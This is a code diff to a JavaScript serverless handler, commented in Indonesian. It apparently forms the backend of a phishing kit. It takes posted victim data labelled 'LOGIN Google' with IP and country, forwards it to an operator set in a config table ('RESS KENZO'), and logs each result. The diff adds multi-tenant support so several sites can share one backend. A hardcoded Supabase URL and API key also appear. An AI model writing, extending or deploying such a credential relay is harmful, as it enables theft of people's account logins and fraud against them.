@@ -22,14 +22,20 @@ export default async function handler(req, res) {
         if (typeof d === "string") d = JSON.parse(d);
         if (!d) return res.status(400).json({ error: "BODY_EMPTY" });
 
+        // --- TAMBAHAN MULTI-TENANT ---
+        const WEB_ID = d.web_id || "web_default"; 
+        // -----------------------------
+
         const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
         const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
         
         let EMAIL = "admin@domain.com"; 
         let NAMA = "RESS KENZO"; 
 
+        // --- TAMBAHAN MULTI-TENANT ---
+        // Filter config berdasarkan WEB_ID
         try {
-            const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?id=eq.1&select=*`, {
+            const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?web_id=eq.${WEB_ID}&select=*`, {
                 headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
             });
             const cfgData = await rCfg.json();
@@ -38,6 +44,7 @@ export default async function handler(req, res) {
                 if (cfgData[0].nama_ress) NAMA = cfgData[0].nama_ress.split('<')[0].trim();
             }
         } catch(e) { console.log("Gagal ambil config:", e); }
+        // -----------------------------
 
         const flag = countryFlag(d.negaraKode || "");
         const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");
@@ -101,6 +108,8 @@ export default async function handler(req, res) {
 
         if (response.ok) {
             try {
+                // --- TAMBAHAN MULTI-TENANT ---
+                // Simpen WEB_ID ke logs_result
                 await fetch(`${SUPABASE_URL}/rest/v1/logs_result`, {
                     method: "POST",
                     headers: { 
@@ -108,8 +117,12 @@ export default async function handler(req, res) {
                         "Authorization": `Bearer ${SUPABASE_KEY}`,
                         "Content-Type": "application/json"
                     },
-                    body: JSON.stringify({ created_at: new Date().toISOString() })
+                    body: JSON.stringify({ 
+                        web_id: WEB_ID, 
+                        created_at: new Date().toISOString() 
+                    })
                 });
+                // -----------------------------
             } catch(e) { console.log("Gagal nyatet log:", e); }
         }
 
